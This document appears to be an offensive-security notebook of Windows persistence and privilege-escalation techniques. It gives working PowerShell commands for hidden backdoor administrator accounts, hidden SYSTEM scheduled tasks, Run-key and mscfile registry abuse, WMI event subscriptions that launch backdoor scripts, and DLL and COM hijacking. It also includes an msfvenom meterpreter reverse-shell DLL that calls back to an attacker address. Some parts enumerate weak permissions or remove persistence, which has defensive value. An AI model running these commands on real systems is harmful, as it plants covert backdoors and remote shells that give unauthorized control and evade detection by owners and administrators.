# User Accounts

#### Create a New Local User
- To create a new local user with a specified password:
	```powershell
	New-LocalUser -Name "<username>" -Password (ConvertTo-SecureString "<password>" -AsPlainText -Force) -FullName "Backdoor User" -Description "Persistence User"
	```

#### Create a Hidden User Account
- Creates a hidden user account by manipulating registry keys. This user will not show up in the login screen or user account lists:
	```powershell
	# Create the new user
	New-LocalUser -Name "<hidden_username>" -Password (ConvertTo-SecureString "<password>" -AsPlainText -Force) -FullName "Hidden User" -Description "Hidden Backdoor User"
	
	# Modify the registry to hide the user from the login screen
	New-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force
	Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "<hidden_username>" -Value 0
	```
	- Explanation: The hidden user is still functional and can be used for remote access but is hidden from the login screen. The registry key `UserList` controls which users appear on the login screen.

#### Add User to Administrators Group
- To ensure persistence, the user can be added to the Administrators group for elevated privileges:
	```powershell
	Add-LocalGroupMember -Group "Administrators" -Member "<username>"
	```
	- Explanation: This grants administrative privileges, allowing full control over the system, which is essential for maintaining persistence.

#### Modify User Password
- Modify the password of an existing user to regain access in case credentials are changed:
	```powershell
	Set-LocalUser -Name "<username>" -Password (ConvertTo-SecureString "<new_password>" -AsPlainText -Force)
	```
	- Explanation: This is useful when attempting to regain access to a backdoor account whose password has been reset.

#### Enable a Disabled User Account
- If a backdoor account gets disabled, it can be re-enabled to maintain persistence:
	```powershell
	Enable-LocalUser -Name "<username>"
	```
	- Explanation: Re-enabling a disabled user account ensures that the backdoor remains active for future use.

#### Automatically Enable User on Boot
- Set the hidden user account to automatically be enabled after every boot by scheduling a task:
	```powershell
	$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-Command Enable-LocalUser -Name '<hidden_username>'"
	$Trigger = New-ScheduledTaskTrigger -AtStartup
	Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "EnableHiddenUser" -Description "Ensures the hidden user is enabled at startup" -User "SYSTEM"
	```
	- Explanation: This ensures the hidden backdoor user account remains enabled even if it gets disabled.

# Scheduled Tasks

#### Scheduled Task Enumeration
- List All Scheduled Tasks:
    ```powershell
    Get-ScheduledTask
    ```
- List All Scheduled Tasks, Including Task Owners and Commands:
    ```powershell
    schtasks /query /fo LIST /v
    ```
- Display Detailed Information for a Specific Scheduled Task:
    ```powershell
    Get-ScheduledTaskInfo -TaskName "<task_name>"
    ```
- Identify Scheduled Tasks Not Running as SYSTEM:
    ```powershell
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -ne "SYSTEM" } | Out-File "C:\Path\To\Outfile.txt"
    ```
- List Tasks Running as SYSTEM:
    ```powershell
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | Out-File "C:\Path\To\Outfile.txt"
    ```

#### Identify Writable Scheduled Task Configuration Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Scheduled_Tasks_Configuration_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Scheduled_Tasks_Configuration_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 output file (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query scheduled tasks and extract task names
$schtasksOutput = schtasks /query /fo LIST /v

# Use a regex to extract the "Task Name" field
$taskNames = $schtasksOutput | ForEach-Object {
    if ($_ -match "^TaskName:\s+(.+)$") {
        # Extract the task name
        $matches[1]
    }
} | Where-Object { $_ -ne $null } # Filter out invalid task names

# Initialize variables to hold the current task details
$currentTask = ""
$currentACL = @()

# Iterate over each task name and retrieve its ACL using Get-Acl
foreach ($taskName in $taskNames) {
    try {
        # Get the ACL information for the task folder (use task name as the folder path in the Scheduled Tasks folder)
        $acl = Get-Acl -Path "C:\Windows\System32\Tasks$taskName" | Format-List | Out-String -Width 300

        # Write the task name and ACL details to the Step 1 output file
        "TaskName: $taskName" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the task and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "TaskName: $taskName" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the task folder doesn't exist), log it to the output file
        "Failed to retrieve ACL for task: $taskName" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Identify Writable Scheduled Task Executable Paths
```powershell
# Set up output file paths
$Step1_OutputFilePath = "C:\Step1_Scheduled_Tasks_Executable_ACL.txt"
$Step2_OutputFilePath = "C:\Step2_Scheduled_Tasks_Executable_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 output file (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query scheduled tasks and extract executables
$schtasksOutput = schtasks /query /fo LIST /v

# Use a regex to extract the "Task To Run" field which contains the path to the executable
$taskExecutables = $schtasksOutput | ForEach-Object {
    if ($_ -match "^Task To Run:\s+(.+)$") {
        # Extract the executable path
        $matches[1]
    }
} | Where-Object { $_ -and (Test-Path $_) } # Filter out invalid paths

# Initialize variables to hold the current task details
$currentTask = ""
$currentACL = @()

# Iterate over each task executable and retrieve its ACL using Get-Acl
foreach ($executable in $taskExecutables) {
    try {
        # Get the ACL information for the task executable
        $acl = Get-Acl -Path $executable | Format-List | Out-String -Width 300

        # Write the executable path and ACL details to the Step 1 output file
        "Executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }
        
        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the task and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "Executable: $executable" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the executable path doesn't exist), log it to the output file
        "Failed to retrieve ACL for executable: $executable" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Create a New Scheduled Task
1. Define the Task Action: Specifies the executable or script to run.
	```powershell
	$action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/c whoami > C:\Temp\whoami.txt'
	```
2. Define a Trigger: Specifies when the task should be triggered, e.g., on logon, system startup, etc.
	```powershell
	$trigger = New-ScheduledTaskTrigger -AtLogon
	```
3. Register the Task: Registers the new task with the system. In this example, it is registered under the SYSTEM account for higher privileges.
	```powershell
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MyPersistentTask" -Description "A persistent scheduled task" -User "SYSTEM"
	```
- Create a Hidden Task: Hide the scheduled task to avoid detection.
    ```powershell
    $settings = New-ScheduledTaskSettingsSet -Hidden
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MyPersistentTask" -Settings $settings -User "SYSTEM"
    ```

#### Modify an Existing Scheduled Task
- Modify a Scheduled Task: You can modify an existing scheduled task's action, trigger, or other properties. In this case, the task action is modified to run a hidden PowerShell script.
	```powershell
	Set-ScheduledTask -TaskName "MyPersistentTask" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command C:\Temp\backdoor.ps1")
	```

#### Delete a Scheduled Task
- Unregister a Scheduled Task: Remove the task from the system.
    ```powershell
    Unregister-ScheduledTask -TaskName "MyPersistentTask" -Confirm:$false
    ```

#### Exploiting Writable Scheduled Tasks

1. Identify Writable Scheduled Tasks:  
   Finds scheduled tasks where non-administrative users, like "Everyone", have writable permissions, making them vulnerable.
	```powershell
	Get-ScheduledTask | ForEach-Object { 
		$task = $_.TaskName
		Get-Acl -Path "C:\Windows\System32\Tasks\$task" | Where-Object { $_.AccessToString -like "*Everyone Allow FullControl*" } 
	} | Out-File "C:\Path\To\Outfile.txt"
	```

2. Exploit Writable Scheduled Task:  
   If a scheduled task has writable permissions, you can alter it to run an elevated PowerShell session.
	```powershell
	schtasks /Change /TN "<TaskName>" /TR "powershell -Command \"Start-Process PowerShell -Verb RunAs\""
	```

3. Change User Running a Task (Requires Admin Privileges):  
   This command changes the user running the task to a new user with provided credentials.
	```powershell
	schtasks /change /tn "<task_name>" /ru "<new_user>" /rp "<new_password>"
	```

#### Change Task Ownership or Credentials
- Change the User Running a Scheduled Task: Modify the user account under which a task is running. Requires administrative privileges.
    ```powershell
    schtasks /change /tn <task_name> /ru <new_user> /rp <new_password>
    ```

#### Scheduled Tasks Payload Examples
- [[Windows Targeting - Scheduled Tasks]]

# Windows Registry

- User-Level Persistence: Entries made under `HKCU` will affect only the current user.
- System-Level: Entries made under `HKLM` will affect the entire system, providing deeper persistence.

#### Manually Browse Registry Keys
```powershell
regedit
```

#### Get-ACL for Registry Hive Recursively
- Script queries target entire Windows Registry Hive for all ACLs:
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Recursively query registry hive for ACLs and save to the output file
Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | 
ForEach-Object { 
    Get-Acl -Path $_.PSPath 
} | Format-List | Out-String -Width 300 | Out-File -FilePath $OutputFilePath -Encoding UTF8
```

#### Get-ACL for Specific Registry Key
- Script queries target specified Windows Registry Key for Access Control List (ACL):
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Retrieve the Access Control List (ACL) for the HKEY_CURRENT_USER registry hive
$RegistryACL = Get-Acl -Path $path

# Convert the ACL to a formatted string for easier reading
$AclFormattedString = $RegistryACL | Format-List | Out-String -Width 300

# Write the formatted ACL to the output file in UTF8 encoding
$AclFormattedString | Out-File -FilePath $OutputFilePath -Encoding UTF8
```

#### Identify Writable Registry Keys
- Script queries target specified Windows Registry Hive for Access Control List (ACL) and parses out keys with weak permissions:
```powershell
# Initialize output file path
$OutputFilePath = "C:\Path\To\Outfile.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Ensure the output file is created/reset with UTF-8 encoding
New-Item -Path $outputFilePath -ItemType File -Force | Out-Null

# Initialize path
$path = "Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\"

# Initialize search patterns array
$SearchPatterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*SetValue.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*SetValue.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*SetValue.*"
)

# Initialize an empty array to store matching registry paths
$MatchingRegistryPaths = @()

# Iterate over registry items and retrieve ACLs from the specified registry path
$RegistryItems = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue

foreach ($RegistryItem in $RegistryItems) {
    try {
        # Retrieve the ACL for the current registry item
        $RegistryACL = Get-Acl -Path $RegistryItem.PSPath

        # Convert the ACL to a string format for pattern matching
        $AclContentString = $RegistryACL | Format-List | Out-String -Width 300

        # Check if the ACL content matches any of the search patterns
        foreach ($Pattern in $SearchPatterns) {
            if ($AclContentString -match $Pattern) {
                # Add the matching registry path to the array
                $MatchingRegistryPaths += $RegistryItem.PSPath
                break  # Stop checking other patterns if a match is found
            }
        }
    } catch {
        # Log error messages for any issues encountered during ACL retrieval
        $ErrorMessage = $_.Exception.Message
        Write-Output "Error processing $($RegistryItem.PSPath): $ErrorMessage"
    }
}

# Write the matching registry paths to the output file
$MatchingRegistryPaths | Out-File -FilePath $OutputFilePath
```

#### Exploit Write Access for Persistence
If the user has `WRITE` or `FULL CONTROL` on specific registry keys, modify them to include malicious payloads that will be executed on startup:
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MaliciousApp' -Value 'C:\path\to\payload.exe'
```

#### Modify Registry for Privilege Escalation
Create or modify registry entries to escalate privileges (e.g., abusing `mscfile` handlers):
```powershell
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass" -PropertyType String -Force
```

#### Remove a Registry Entry
To remove a malicious persistence key:
```powershell
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "MyBackdoor"
```

#### View Startup Program Registry Entries
View all entries in the `Run` key, commonly used for persistence:
```powershell
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
```

#### Add a Registry Entry for Startup Persistence
You can add entries in the `Run` key for persistence:
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "MyBackdoor" -Value "C:\Backdoor\backdoor.exe"
```

#### Registry Key Payload Examples
- [[Windows Targeting - Registry Values]]

# Windows Management Instrumentation (WMI)

WMI Event Subscriptions enable persistence by executing commands in response to specific WMI events. These can be triggered based on system events such as process creation, user logon, file creation, or time-based events.

#### View Registered WMI Event Filters
WMI Event Filters define the conditions under which the event will trigger.
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
```

#### View Registered Consumers
Consumers define the action (e.g., command execution) that is taken when an event is triggered.
```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

#### View Filter to Consumer Bindings
The FilterToConsumerBinding links the event filter with its associated consumer.
```powershell
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

## Creating a WMI Event Subscription for Persistence

You can create a persistent WMI event subscription that triggers an action based on system events like process creation, file creation, or user logon. 

#### Persist via Process Monitoring
This example creates a WMI subscription that runs a PowerShell script when a specific process (`notepad.exe`) starts.
```powershell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "ProcessFilter"; 
    QueryLanguage = "WQL"; 
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "ProcessConsumer"; 
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Backdoor\backdoor.ps1"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; 
    Consumer = $consumer
}
```

#### Persist via Time-Based Events
This creates a WMI event subscription that triggers daily at 10:00 AM by using the `Win32_LocalTime` class.
```powershell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "TimeFilter"; 
    QueryLanguage = "WQL"; 
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance.Minute = 0"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "TimeConsumer"; 
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Backdoor\daily_backdoor.ps1"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; 
    Consumer = $consumer
}
```

#### Persist via File Creation Event
This example triggers the execution of a payload when a specific file (`trigger.txt`) is created in a specified directory.
```powershell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "FileCreationFilter"; 
    QueryLanguage = "WQL"; 
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'CIM_DataFile' AND TargetInstance.Name = 'C:\\path\\to\\trigger.txt'"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "FileConsumer"; 
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Backdoor\payload.ps1"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; 
    Consumer = $consumer
}
```

## Removing WMI Event Subscriptions

To remove a WMI event subscription, you need to delete the specific filter, consumer, and filter-to-consumer binding.

#### Remove WMI Event Filter
To remove a filter, locate its name and delete it:
```powershell
$filter = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -eq "ProcessFilter" }
$filter.Delete()
```

#### Remove WMI Event Consumer
Similarly, find and delete the event consumer:
```powershell
$consumer = Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "ProcessConsumer" }
$consumer.Delete()
```

#### Remove Filter to Consumer Binding
Finally, remove the binding between the filter and the consumer:
```powershell
$binding = Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*ProcessFilter*" }
$binding.Delete()
```

## Examples of WMI Persistence

- Persist on Process Creation (e.g., explorer.exe starts):
   ```powershell
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
       Name = "ExplorerPersistence"; 
       QueryLanguage = "WQL"; 
       Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
   }

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
       Name = "ExplorerConsumer"; 
       CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Backdoor\explorer_backdoor.ps1"
   }

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
       Filter = $filter; 
       Consumer = $consumer
   }
   ```

- Persist via File Creation:
   ```powershell
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
       Name = "FileCreationPersistence"; 
       QueryLanguage = "WQL"; 
       Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'CIM_DataFile' AND TargetInstance.Name = 'C:\\path\\to\\logfile.txt'"
   }

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
       Name = "FileConsumer"; 
       CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Backdoor\file_trigger.ps1"
   }

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
       Filter = $filter; 
       Consumer = $consumer
   }
   ```

# DLL Hijacking

DLL Hijacking occurs when an application or service loads a Dynamic Link Library (DLL) from a location where an attacker has placed a malicious DLL due to improper directory or path permissions.

## Identifying Vulnerable DLLs

#### View All DLLs Loaded for a Specific Process
To check the DLLs loaded by a specific process, use its PID (Process ID):
```powershell
Get-Process -Id <PID> | Select-Object -ExpandProperty Modules | Select-Object ModuleName, FileName
```

#### View All DLLs Loaded by Running Processes
You can inspect the DLLs loaded by all currently running processes. This can help identify potential target DLLs for hijacking.
```powershell
Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -like "*.dll" } | Select-Object ModuleName, FileName
```

#### Find Vulnerable Services for DLL Hijacking
Search for services that are executing from insecure directories such as `System32`, where DLL hijacking may be possible:
```powershell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -match "System32" } | Select-Object Name, PathName
```

#### Search for DLL Files in Vulnerable Directories
You can list all DLL files in a potentially vulnerable directory (with insecure permissions) and check the permissions of specific DLLs:
```powershell
Get-ChildItem -Path "C:\Vulnerable\Directory" -Recurse | Where-Object { $_.Extension -eq '.dll' }
icacls "C:\Vulnerable\Directory\SomeDLL.dll"
```

#### Look for Unquoted Service Paths
Unquoted service paths can be exploited to load malicious DLLs. These services may load DLLs from unintended directories if the path is not properly enclosed in quotes.
```powershell
Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE PathName LIKE '% %'"
```

#### Identify Writable DLLs Loaded by Processes
```powershell
# Set up output file paths
$Step1_OutputFilePath = "E:\Step1_DLL_ACL.txt"
$Step2_OutputFilePath = "E:\Step2_DLL_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 and Step 2 output files (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query all running processes
$processes = Get-Process

# Initialize variables to hold the current process and loaded DLL details
$currentProcess = ""
$currentACL = @()

# Iterate over each process and retrieve the list of loaded DLLs
foreach ($process in $processes) {
    try {
        # Get the list of loaded modules (DLLs) for the current process
        $dlls = $process.Modules | Where-Object { $_.ModuleName -like "*.dll" } | ForEach-Object { $_.FileName }
        
        # Process each loaded DLL
        foreach ($dll in $dlls) {
            $cleanDLLPath = $dll -replace '"', '' # Remove any surrounding quotes from the path

            # Check if the DLL path is valid and get the ACL details
            if (Test-Path $cleanDLLPath) {
                try {
                    # Get the ACL information for the DLL
                    $acl = Get-Acl -Path $cleanDLLPath | Format-List | Out-String -Width 300

                    # Write the DLL path and ACL details to the Step 1 output file
                    "DLL Path: $cleanDLLPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

                    # Add ACL entries for matching
                    $aclEntries = $acl -split "`n"
                    $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

                    # Check for matches in the ACL entries
                    $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

                    # If any matching ACL entry is found, write the DLL and matching ACLs to the Step 2 output file
                    if ($matchingEntries.Count -gt 0) {
                        "DLL Path: $cleanDLLPath" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                        $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                        "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
                    }
                }
                catch {
                    # If an error occurs (e.g., if the DLL path doesn't exist), log it to the output file
                    "Failed to retrieve ACL for DLL: $cleanDLLPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                }
            }
        }
    }
    catch {
        # Log any error retrieving DLLs for the process
        "Failed to retrieve DLLs for process: $($process.Name) (PID: $($process.Id))" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

## Exploiting DLL Hijacking

#### Step 1: Create a Malicious DLL
To exploit DLL hijacking, first create a malicious DLL payload. You can use `msfvenom` to generate a DLL payload that will execute a reverse shell or similar malicious code:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f dll -o malicious.dll
```

#### Step 2: Place the Malicious DLL in the Target Directory
Once the DLL is generated, place it in the directory where the vulnerable service or application will load it. Ensure the directory has appropriate permissions for the DLL to be executed:
```powershell
Copy-Item -Path "C:\Path\To\malicious.dll" -Destination "C:\Vulnerable\Directory\malicious.dll"
```

#### Step 3: Restart the Service or Program
After placing the malicious DLL in the appropriate directory, restart the vulnerable service or application to trigger the loading of your malicious DLL:
```powershell
Restart-Service -Name "<service_name>"
```
Or restart the target program manually, depending on the context of the hijacking.

# Component Object Model (COM) Hijacking

COM Hijacking is a method used to maintain persistence on a Windows host by registering or hijacking a COM object, causing it to load a malicious DLL or executable when invoked by the system.

#### View Registered COM Objects
To enumerate COM objects currently registered on the system:
```powershell
Get-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\'
```
This retrieves information about COM objects under the current user's context, but it can also be done system-wide:
```powershell
Get-ItemProperty -Path 'HKLM:\Software\Classes\CLSID\'
```

#### Register a Malicious COM Object for Persistence
You can create a new COM object and register it to load a malicious DLL to maintain persistence:
```powershell
New-Item -Path "HKCU:\Software\Classes\CLSID\{<GUID>}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{<GUID>}\InprocServer32" -Name "(Default)" -Value "C:\path\to\malicious.dll"
